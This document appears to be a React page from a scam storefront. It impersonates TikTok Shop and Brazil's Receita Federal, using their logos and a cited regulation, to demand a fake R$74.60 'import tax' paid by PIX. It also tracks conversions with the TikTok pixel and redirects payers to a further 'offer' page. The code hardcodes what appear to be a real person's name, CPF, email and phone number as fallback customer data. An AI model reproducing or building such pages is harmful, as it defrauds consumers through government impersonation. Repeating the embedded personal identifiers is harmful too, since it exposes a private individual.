import { useState, useEffect } from 'react';
import { AlertTriangle, Copy, CheckCircle, Shield, FileText } from 'lucide-react';

declare global {
  interface Window {
    ttq: any;
  }
}

export default function TaxaPage() {
  const [showModal, setShowModal] = useState(false);
  const [isGeneratingPayment, setIsGeneratingPayment] = useState(false);
  const [pixCode, setPixCode] = useState('');
  const [qrCodeUrl, setQrCodeUrl] = useState('');
  const [transactionId, setTransactionId] = useState('');
  const [copied, setCopied] = useState(false);
  const [paymentStatus, setPaymentStatus] = useState('pending');
  
  const TAXA_VALOR = 74.60;
  
  // Busca dados do cliente salvos no localStorage ou usa fallback
  const getCustomerData = () => {
    try {
      const savedData = localStorage.getItem('customerData');
      if (savedData) {
        const data = JSON.parse(savedData);
        console.log('✅ Dados do cliente carregados do localStorage:', data);
        return data;
      }
    } catch (error) {
      console.error('Erro ao carregar dados do cliente:', error);
    }
    
    // Fallback para dados fixos
    console.log('⚠️ Usando dados fixos (fallback)');
    return {
      nome: 'PAULO ALVES DA SILVA',
      cpf: '06953135417',
      email: 'poulsi14@gmail.com',
      telefone: '11959107965'
    };
  };
  
  const DADOS_CLIENTE = getCustomerData();

  // TikTok Pixel - CompletePayment Event (Conversão Final)
  useEffect(() => {
    const purchaseKey = 'ttq_purchase_completed';
    const hasTracked = sessionStorage.getItem(purchaseKey);
    
    if (hasTracked) {
      console.log('✅ CompletePayment já rastreado nesta sessão - evitando duplicação');
      return;
    }

    const trackCompletePayment = () => {
      if (window.ttq && window.ttq.track) {
        try {
          // Busca dados do produto do localStorage
          const productData = localStorage.getItem('customerData');
          const productPrice = 149.90; // Preço da Camisa Flamengo

          window.ttq.track('CompletePayment', {
            content_type: 'product',
            content_id: 'product-1',
            content_name: 'Camisa I Flamengo 25/26',
            currency: 'BRL',
            value: productPrice
          });
          
          sessionStorage.setItem(purchaseKey, 'true');
          console.log('🎯 TikTok CompletePayment Event (Conversão) disparado: R$', productPrice);
        } catch (error) {
          console.error('❌ Erro ao disparar CompletePayment:', error);
        }
      }
    };

    // Aguarda 1 segundo para garantir que o pixel foi carregado
    const timer = setTimeout(trackCompletePayment, 1000);
    return () => clearTimeout(timer);
  }, []);

  useEffect(() => {
    if (!transactionId || paymentStatus === 'paid') return;

    // Verificação de status a cada 1 segundo (igual à página de pagamento)
    const statusCheckInterval = setInterval(async () => {
      try {
        const statusResponse = await fetch(`/api/transactions/${transactionId}`);
        
        if (statusResponse.ok) {
          const statusData = await statusResponse.json();
          
          console.log('🔍 Verificando status da taxa:', statusData.status);
          
          // Verifica se o pagamento foi confirmado
          if (statusData.status === 'paid') {
            console.log('✅ TAXA PAGA! Redirecionando para /oferta/acompanhamento em 500ms...');
            setPaymentStatus('paid');
            clearInterval(statusCheckInterval);
            
            // Pequeno delay para garantir que o log aparece
            setTimeout(() => {
              window.location.href = '/oferta/acompanhamento';
            }, 500);
          }
        }
      } catch (error) {
        // Falha silenciosa - não mostra nada ao usuário
      }
    }, 1000); // Verifica a cada 1 segundo

    return () => clearInterval(statusCheckInterval);
  }, [transactionId, paymentStatus]);

  const handleRegularizar = async () => {
    setShowModal(true);
    setIsGeneratingPayment(true);
    
    try {
      const emailSemAcento = DADOS_CLIENTE.email
        .normalize('NFD')
        .replace(/[\u0300-\u036f]/g, '');

      const paymentData = {
        amount: TAXA_VALOR.toFixed(2),
        customer_name: DADOS_CLIENTE.nome,
        customer_email: emailSemAcento,
        customer_cpf: DADOS_CLIENTE.cpf,
        customer_phone: DADOS_CLIENTE.telefone,
        description: 'Taxa de Importação - Escavadeira Infantil 12V'
      };

      const response = await fetch('/api/payments', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(paymentData)
      });

      const responseData = await response.json();
      
      if (!response.ok) {
        throw new Error(responseData.error?.message || 'Erro ao criar pagamento');
      }

      const transaction = responseData.data || responseData;
      
      console.log('Transaction data:', transaction);
      
      setPixCode(transaction.pix_code || transaction.pixCode || '');
      setQrCodeUrl(transaction.qr_code_url || transaction.qrCodeUrl || transaction.pix_qr_code || '');
      setTransactionId(transaction.transaction_id || transaction.id || '');
      
    } catch (error: any) {
      console.error('Erro ao processar pagamento:', error);
      alert(`Erro ao processar pagamento: ${error.message || 'Tente novamente.'}`);
      setShowModal(false);
    } finally {
      setIsGeneratingPayment(false);
    }
  };

  const handleCopyPixCode = () => {
    navigator.clipboard.writeText(pixCode);
    setCopied(true);
    setTimeout(() => setCopied(false), 3000);
  };

  return (
    <div className="bg-gray-50 min-h-screen w-full">
      {/* Header */}
      <div className="bg-black px-4 py-3">
        <img 
          src="https://jc.tec.br/wp-content/uploads/2022/09/Logo-Tiktok-Branco.png"
          alt="TikTok Shop"
          className="h-8 mx-auto object-contain"
        />
      </div>

      {/* Conteúdo Principal */}
      <div className="px-4 py-6">
        {/* Card de Alerta */}
        <div className="bg-white rounded-lg shadow-sm border border-gray-200 p-5 mb-4">
          <div className="flex items-start space-x-3 mb-4">
            <div className="flex-shrink-0">
              <AlertTriangle className="w-5 h-5 text-amber-500" />
            </div>
            <div className="flex-1">
              <h1 className="text-base font-semibold text-gray-900 mb-1">
                Produto Importado
              </h1>
              <p className="text-xs text-gray-600 leading-relaxed">
                Regularização necessária para liberação alfandegária
              </p>
            </div>
          </div>

          {/* Logo Receita Federal */}
          <div className="flex justify-center py-3 border-t border-gray-100">
            <img 
              src="https://www.gov.br/receitafederal/pt-br/assuntos/aduana-e-comercio-exterior/manuais/remessas-postal-e-expressa/calculadora-versao-iii/componentes/cabecalho/img/receita-federal-logo.png"
              alt="Receita Federal"
              className="h-10 object-contain opacity-80"
            />
          </div>
        </div>

        {/* Card de Informação */}
        <div className="bg-white rounded-lg shadow-sm border border-gray-200 p-4 mb-4">
          <div className="flex items-start space-x-2 mb-3">
            <FileText className="w-4 h-4 text-gray-400 mt-0.5 flex-shrink-0" />
            <div>
              <p className="text-xs text-gray-700 leading-relaxed mb-2">
                Este produto é de origem importada e está sujeito ao pagamento de taxa conforme legislação da Receita Federal do Brasil.
              </p>
              <p className="text-xs text-gray-600 leading-relaxed">
                IN RFB nº 1.737/2017: produtos acima de US$ 50,00 exigem Imposto de Importação.
              </p>
            </div>
          </div>
        </div>

        {/* Card de Valor */}
        <div className="bg-gradient-to-br from-red-50 to-pink-50 rounded-lg border border-red-200 p-4 mb-4">
          <div className="text-center">
            <p className="text-xs text-gray-600 mb-1 font-medium">
              Taxa de Importação
            </p>
            <p className="text-3xl font-bold text-red-600 mb-1">
              R$ {TAXA_VALOR.toFixed(2).replace('.', ',')}
            </p>
            <p className="text-[10px] text-gray-500">
              Alíquota de 60% sobre o valor do produto
            </p>
          </div>
        </div>

        {/* Card de Aviso */}
        <div className="bg-gray-900 rounded-lg p-3 mb-5">
          <div className="flex items-start space-x-2">
            <Shield className="w-4 h-4 text-amber-400 mt-0.5 flex-shrink-0" />
            <p className="text-xs text-white leading-relaxed">
              <strong className="font-semibold">Atenção:</strong> Sem o pagamento, o produto não será liberado pela Receita Federal.
            </p>
          </div>
        </div>

        {/* Botão */}
        <button
          onClick={handleRegularizar}
          className="w-full bg-[#F52B56] text-white py-3 rounded-lg font-semibold text-sm hover:bg-[#d42448] transition-colors shadow-sm"
          data-testid="button-regularizar-pedido"
        >
          Regularizar Importação
        </button>

        {/* Footer */}
        <div className="mt-4 text-center space-y-1">
          <p className="text-[10px] text-gray-500">
            🔒 Pagamento seguro via PIX
          </p>
          <p className="text-[10px] text-gray-400">
            Liberação automática após confirmação
          </p>
        </div>
      </div>

      {/* Modal de Pagamento */}
      {showModal && (
        <div className="fixed inset-0 bg-black bg-opacity-60 flex items-center justify-center z-50 p-4">
          <div className="bg-white rounded-xl max-w-sm w-full max-h-[90vh] overflow-y-auto shadow-2xl">
            {/* Header do Modal */}
            <div className="bg-gradient-to-r from-[#F52B56] to-[#d42448] text-white p-3 rounded-t-xl">
              <div className="flex items-center justify-center space-x-2">
                {paymentStatus === 'paid' ? (
                  <>
                    <CheckCircle className="w-4 h-4" />
                    <span className="text-sm font-semibold">Pagamento Confirmado!</span>
                  </>
                ) : (
                  <>
                    <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-white"></div>
                    <span className="text-sm font-medium">
                      {isGeneratingPayment ? 'Gerando pagamento...' : 'Aguardando pagamento...'}
                    </span>
                  </>
                )}
              </div>
            </div>

            {/* Conteúdo do Modal */}
            <div className="p-5">
              {isGeneratingPayment ? (
                <div className="flex flex-col items-center justify-center py-10">
                  <div className="animate-spin rounded-full h-12 w-12 border-b-3 border-[#F52B56] mb-3"></div>
                  <p className="text-sm text-gray-600">
                    Gerando código PIX...
                  </p>
                </div>
              ) : paymentStatus === 'paid' ? (
                <div className="text-center py-10">
                  <CheckCircle className="w-14 h-14 text-green-500 mx-auto mb-3" />
                  <p className="text-base font-semibold text-green-600 mb-1">
                    Taxa paga com sucesso!
                  </p>
                  <p className="text-xs text-gray-600">
                    Redirecionando...
                  </p>
                </div>
              ) : (
                <>
                  {/* Valor */}
                  <div className="text-center mb-4 pb-4 border-b border-gray-100">
                    <p className="text-xs text-gray-500 mb-1">
                      Valor a pagar
                    </p>
                    <p className="text-2xl font-bold text-gray-900">
                      R$ {TAXA_VALOR.toFixed(2).replace('.', ',')}
                    </p>
                  </div>

                  {/* QR Code */}
                  {qrCodeUrl && (
                    <div className="flex justify-center mb-4">
                      <div className="bg-white p-2 rounded-lg border-2 border-gray-200">
                        <img 
                          src={qrCodeUrl} 
                          alt="QR Code PIX"
                          className="w-48 h-48"
                          data-testid="img-qr-code"
                        />
                      </div>
                    </div>
                  )}

                  {/* Código PIX */}
                  {pixCode && (
                    <>
                      <div className="bg-gray-50 p-3 rounded-lg mb-3 border border-gray-200">
                        <p className="text-[10px] text-gray-500 mb-1.5 font-medium">
                          Código PIX Copia e Cola:
                        </p>
                        <p className="text-[10px] break-all font-mono text-gray-700 leading-relaxed">
                          {pixCode}
                        </p>
                      </div>

                      {/* Botão Copiar */}
                      <button
                        onClick={handleCopyPixCode}
                        className={`w-full py-2.5 rounded-lg font-semibold text-sm transition-all ${
                          copied 
                            ? 'bg-green-500 text-white shadow-lg' 
                            : 'bg-[#F52B56] text-white hover:bg-[#d42448] shadow-sm'
                        }`}
                        data-testid="button-copiar-pix"
                        data-copied={copied ? 'true' : 'false'}
                        aria-pressed={copied}
                      >
                        {copied ? (
                          <span className="flex items-center justify-center">
                            <CheckCircle className="w-4 h-4 mr-2" />
                            Código Copiado!
                          </span>
                        ) : (
                          <span className="flex items-center justify-center">
                            <Copy className="w-4 h-4 mr-2" />
                            Copiar Código PIX
                          </span>
                        )}
                      </button>
                    </>
                  )}

                  {/* Instruções */}
                  <div className="mt-3 text-center">
                    <p className="text-[10px] text-gray-500 leading-relaxed">
                      Abra o app do seu banco e escaneie o QR Code<br />ou cole o código PIX para realizar o pagamento
                    </p>
                  </div>
                </>
              )}
            </div>

            {/* Fechar Modal */}
            {!isGeneratingPayment && paymentStatus === 'pending' && (
              <div className="border-t border-gray-100 p-3">
                <button
                  onClick={() => setShowModal(false)}
                  className="w-full py-2 text-xs text-gray-600 hover:text-gray-900 font-medium"
                  data-testid="button-fechar-modal"
                >
                  Fechar
                </button>
              </div>
            )}
          </div>
        </div>
      )}
    </div>
  );
}
